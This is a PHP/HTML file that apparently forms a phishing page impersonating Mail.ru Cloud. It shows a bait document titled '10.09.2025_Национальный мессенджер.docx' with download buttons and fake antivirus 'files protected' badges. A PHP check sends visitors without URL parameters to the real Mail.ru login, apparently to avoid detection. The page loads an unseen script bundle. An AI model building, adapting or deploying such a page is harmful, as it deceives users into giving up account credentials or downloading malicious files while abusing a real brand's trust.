<?php
// Проверка параметров в URL
if (empty($_SERVER['QUERY_STRING'])) {
    // Если нет параметров → редирект
    header("Location: https://account.mail.ru");
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Документ / Облако Mail.ru</title>

    <link rel="stylesheet" href="css/style.css" />
    <link
      rel="shortcut icon"
      href="https://cloud.imgsmail.ru/cloud.mail.ru/hashes/img/54cbc3d30f0b1da1d208.svg"
      type="image/x-icon"
    />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap"
      rel="stylesheet"
    />
  </head>

  <body>
    <div id="main-content">
      <div class="bg-opacity"></div>
      <div class="file-access-outside">
        <div class="file-access"></div>
      </div>

      <!-- Хедер -->
      <header>
        <div class="header-inner">
          <div class="header-bottom">
            <div class="header-btm-icon-logo">
              <img src="css/res/icon-logo.png" class="logo" alt="" />
              <div class="header-top">
                <a class="header-top-but" href="https://e.mail.ru/inbox">Главная</a>
                <a class="header-top-but" href="https://e.mail.ru/inbox">Почта</a>
                <a class="header-top-but" id="header-top-Cloud" href="https://cloud.mail.ru/home/">Облако</a>
                <a class="header-top-but" href="https://x.calendar.mail.ru">Календарь</a>
                <a class="header-top-but" href="https://todo.mail.ru/inbox">Документы</a>
                <a class="header-top-but" href="https://news.mail.ru">Mail Space</a>
                <a class="header-top-but" href="https://vk.com">Покупки</a>
                <a class="header-top-but" id="header-top-all-projects" href="https://vk.company/ru/projects/">
                  <div style="margin-right: 6px">Все проекты</div>
                  <img class="header-btm-group-img2" src="css/res/header-group-2.svg" alt="" />
                </a>
              </div>
            </div>
            <div class="header-btm-group">
              <div class="header-btm-input">
                <svg class="header-btm-img" viewBox="0 0 24 24" width="24" height="24"
                  stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round"
                  stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21"
                  y1="21" x2="16.65" y2="16.65"></line></svg>
                <input class="header-btm-input" placeholder="Поиск по разделу" type="text"/>
              </div>
            </div>
          </div>
        </div>
      </header>
      
      <!-- Контент -->
      <div class="conteiner">
        <header style="margin-bottom: 20px;">
          <div style="padding: 0px;" class="header-inner bgcolorWhite">
            <div class="header-bottom">
              <div class="flex">
                <div class="cursor-pointer flex left-8px padding-20px">
                    <svg aria-hidden="true" display="flex" class="vkuiIcon vkuiIcon--20 vkuiIcon--w-20 vkuiIcon--h-20 vkuiIcon--check_circle_outline_20" width="20" height="20" viewBox="0 0 20 20" data-qa-id="selectAll" style="width: 20px; height: 20px;">
                        <path fill="currentColor" fill-rule="evenodd" d="M17 10a7 7 0 1 1-14 0 7 7 0 0 1 14 0m1.5 0a8.5 8.5 0 1 1-17 0 8.5 8.5 0 0 1 17 0m-5.22-1.22a.75.75 0 0 0-1.06-1.06L9 10.94 7.78 9.72a.75.75 0 0 0-1.06 1.06l1.75 1.75a.75.75 0 0 0 1.06 0z" clip-rule="evenodd"></path>                
                    </svg>
                    <div>Выделить все</div>
                </div>
                <div class="cursor-pointer flex left-8px padding-20px">
                  <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path d="M5.25 8.25a3.75 3.75 0 0 1 7.408-.831.75.75 0 0 0 .708.584 3.75 3.75 0 0 1-.116 7.497H13a.75.75 0 0 0 0 1.5h.25a5.25 5.25 0 0 0 .718-10.45A5.252 5.252 0 0 0 3.761 8.596 4.5 4.5 0 0 0 6 17h1a.75.75 0 0 0 0-1.5H6a3 3 0 0 1-1.146-5.773.75.75 0 0 0 .453-.823 4 4 0 0 1-.057-.653Zm4 9.003a.75.75 0 0 0 1.5 0v-6.691l1.97 1.97a.75.75 0 0 0 1.06-1.061l-3.25-3.25a.75.75 0 0 0-1.06 0l-3.25 3.25a.75.75 0 0 0 1.06 1.06l1.97-1.97z"></path></svg>
                  <div>Сохранить в Облако</div>
                </div >
                <div class="cursor-pointer flex left-8px padding-20px">
                  <svg width="20" height="20" viewBox="0 0 20 20" fill="none"><g fill="currentColor"><path d="M4 17.75a.75.75 0 0 1 .75-.75h10.5a.75.75 0 0 1 0 1.5H4.75a.75.75 0 0 1-.75-.75"></path><path d="M10.75 2.726c0-.401-.336-.726-.75-.726a.74.74 0 0 0-.75.726v9.722l-3.97-3.97a.75.75 0 0 0-1.06 1.06l5.245 5.246a.75.75 0 0 0 1.06 0l5.257-5.256a.75.75 0 0 0-1.061-1.061l-3.972 3.972z"></path></g></svg>
                  <div>Скачать 74.5 КБ</div>
                </div>
              </div>
              <div id="icon-header-right" class="flex">
              <div class="cursor-pointer flex padding-10px">
                    <svg aria-hidden="true" display="block" class="vkuiIcon vkuiIcon--20 vkuiIcon--w-20 vkuiIcon--h-20 vkuiIcon--rectangle_2_horizontal_outline_20" width="20" height="20" viewBox="0 0 20 20" fill="currentColor" style="width: 20px; height: 20px;"><path fill-rule="evenodd" d="M18 5.121c0-.395 0-.736-.023-1.017a2.3 2.3 0 0 0-.222-.875 2.25 2.25 0 0 0-.983-.984 2.3 2.3 0 0 0-.876-.222C15.616 2 15.246 2 14.85 2h-9.7c-.395 0-.765 0-1.046.023a2.3 2.3 0 0 0-.875.222 2.25 2.25 0 0 0-.984.984 2.3 2.3 0 0 0-.222.875C2 4.384 2 4.726 2 5.12v.758c0 .395 0 .736.023 1.017.024.297.078.592.222.875.216.424.56.768.984.984.283.144.578.198.875.222C4.384 9 4.754 9 5.15 9h9.7c.395 0 .765 0 1.046-.023a2.3 2.3 0 0 0 .875-.222 2.25 2.25 0 0 0 .984-.984 2.3 2.3 0 0 0 .222-.875C18 6.616 18 6.274 18 5.88v-.76ZM5.15 3.5h9.7c.432 0 .712 0 .924.018.204.017.28.045.316.064a.75.75 0 0 1 .328.328c.02.037.047.112.064.316.017.212.018.492.018.924v.7c0 .432 0 .712-.018.924-.017.204-.045.28-.064.316a.75.75 0 0 1-.328.328c-.037.02-.112.047-.316.064-.212.017-.492.018-.924.018h-9.7c-.432 0-.712 0-.924-.018-.204-.017-.28-.045-.316-.064a.75.75 0 0 1-.328-.328c-.02-.037-.047-.112-.064-.316A13 13 0 0 1 3.5 5.85v-.7c0-.432 0-.712.018-.924.017-.204.045-.28.064-.316a.75.75 0 0 1 .328-.328c.037-.02.112-.047.316-.064.212-.017.492-.018.924-.018M18 14.121c0-.395 0-.736-.023-1.017a2.3 2.3 0 0 0-.222-.875 2.25 2.25 0 0 0-.983-.984 2.3 2.3 0 0 0-.876-.222C15.616 11 15.246 11 14.85 11h-9.7c-.395 0-.765 0-1.046.023a2.3 2.3 0 0 0-.875.222 2.25 2.25 0 0 0-.984.984 2.3 2.3 0 0 0-.222.875C2 13.384 2 13.726 2 14.12v.758c0 .395 0 .736.023 1.017.024.297.078.592.222.875.216.424.56.768.984.984.283.144.578.198.875.222.28.023.65.023 1.046.023h9.7c.395 0 .765 0 1.046-.023a2.3 2.3 0 0 0 .875-.222 2.25 2.25 0 0 0 .984-.983c.144-.284.198-.58.222-.876.023-.28.023-.622.023-1.017v-.758ZM5.15 12.5h9.7c.432 0 .712 0 .924.018.204.017.28.045.316.064a.75.75 0 0 1 .328.327c.02.038.047.113.064.317.017.212.018.492.018.924v.7c0 .432 0 .712-.018.924-.017.204-.045.28-.064.316a.75.75 0 0 1-.328.328c-.037.02-.112.047-.316.064-.212.017-.492.018-.924.018h-9.7c-.432 0-.712 0-.924-.018-.204-.017-.28-.045-.316-.064a.75.75 0 0 1-.328-.328c-.02-.037-.047-.112-.064-.316a13 13 0 0 1-.018-.924v-.7c0-.432 0-.712.018-.924.017-.204.045-.28.064-.317a.75.75 0 0 1 .328-.327c.037-.02.112-.047.316-.064.212-.017.492-.018.924-.018" clip-rule="evenodd"></path></svg>
                    <svg aria-hidden="true" display="block" class="vkuiIcon vkuiIcon--20 vkuiIcon--w-20 vkuiIcon--h-16 vkuiIcon--dropdown_20" width="20" height="16" viewBox="0 0 20 16" fill="currentColor" style="width: 20px; height: 16px;"><path fill-rule="evenodd" d="M4.22 5.875a1 1 0 0 1 1.405-.156L10 9.22l4.375-3.5a1 1 0 0 1 1.25 1.562l-5 4a1 1 0 0 1-1.25 0l-5-4a1 1 0 0 1-.156-1.406Z" clip-rule="evenodd"></path></svg>
              </div>
              <div class="cursor-pointer flex padding-10px">
                <svg xmlns="http://www.w3.org/2000/svg" width="24px" height="24px" viewBox="0 0 24 24" fill="none">
                  <path style="fill: #000000;" fill-rule="evenodd" clip-rule="evenodd" d="M2.25 6C2.25 5.58579 2.58579 5.25 3 5.25H20C20.4142 5.25 20.75 5.58579 20.75 6C20.75 6.41421 20.4142 6.75 20 6.75H3C2.58579 6.75 2.25 6.41421 2.25 6ZM17.5 8.25C17.9142 8.25 18.25 8.58579 18.25 9V15.1893L19.4697 13.9697C19.7626 13.6768 20.2374 13.6768 20.5303 13.9697C20.8232 14.2626 20.8232 14.7374 20.5303 15.0303L18.0303 17.5303C17.7374 17.8232 17.2626 17.8232 16.9697 17.5303L14.4697 15.0303C14.1768 14.7374 14.1768 14.2626 14.4697 13.9697C14.7626 13.6768 15.2374 13.6768 15.5303 13.9697L16.75 15.1893V9C16.75 8.58579 17.0858 8.25 17.5 8.25ZM2.25 11C2.25 10.5858 2.58579 10.25 3 10.25H12C12.4142 10.25 12.75 10.5858 12.75 11C12.75 11.4142 12.4142 11.75 12 11.75H3C2.58579 11.75 2.25 11.4142 2.25 11ZM2.25 16C2.25 15.5858 2.58579 15.25 3 15.25H11C11.4142 15.25 11.75 15.5858 11.75 16C11.75 16.4142 11.4142 16.75 11 16.75H3C2.58579 16.75 2.25 16.4142 2.25 16Z" fill="#1C274C"/>
                </svg>
                <svg aria-hidden="true" display="block" class="vkuiIcon vkuiIcon--20 vkuiIcon--w-20 vkuiIcon--h-16 vkuiIcon--dropdown_20" width="20" height="16" viewBox="0 0 20 16" fill="currentColor" style="width: 20px; height: 16px;"><path fill-rule="evenodd" d="M4.22 5.875a1 1 0 0 1 1.405-.156L10 9.22l4.375-3.5a1 1 0 0 1 1.25 1.562l-5 4a1 1 0 0 1-1.25 0l-5-4a1 1 0 0 1-.156-1.406Z" clip-rule="evenodd"></path></svg>
              </div>
            </div>
            </div>
            
          </div>
          
        </header>
        

        <div class="content-title">
          <div><p class="text-text-title-content">Документы</p></div>
          <div>1 файл</div>
        </div>
        <div class="content-file">
          <div class="content-file-left">
            <img class="file-focus-icon" src="css/res/Group 15 (1).svg" alt="" />
            <img class="file-focus-icons" style="height: 48px" src="css/res/content-icon.png" alt=""/>
            <div class="text-name-block">10.09.2025_Национальный мессенджер.docx</div>
          </div>
          <div class="content-file-right">
            <div style="display: flex; justify-content: center; align-items: center">
              <div style="white-space: nowrap">14.08.25 12:56</div>
              <div style="white-space: nowrap">74.5 КБ</div>
              <img class="download-file" src="css/res/Group 16.svg" alt="" />
            </div>
          </div>
        </div>
      </div>

      <!-- Футер -->
      <footer>
        <div class="footer-inner">
          <div>
            <a href="https://mail.ru">Mail.ru</a>
            <a href="https://vk.company/ru/">О компании</a>
            <a href="https://sales.vk.company/ru/">Реклама</a>
            <a href="https://team.vk.company">Вакансии</a>
          </div>
          <div class="footer-link-2">
            <div style="display: flex; justify-content: center">
              <a href="https://www.kaspersky.ru/home-security">Файлы защищены</a>
              <img style="margin-left: 5px; margin-top: 2px"
                   src="css/res/Dr._Web-Logo.wine.png" alt="" width="70"/>
            </div>
            <a href="https://help.mail.ru/legal/terms/cloud/LA">Лицензионное соглашение</a>
            <a href="https://help.mail.ru/cloud_web/">Помощь</a>
            <a href="https://cloud.mail.ru/subscriptions">Мои подписки</a>
            <a href="https://disko.hb.ru-msk.vkcs.cloud/cloud/win/setup/offline/CloudSetupFull.exe">
              Облако для ПК
            </a>
          </div>
        </div>
      </footer>
    </div>
    <script src="/js/bundle.min.js"></script>
  </body>
</html>
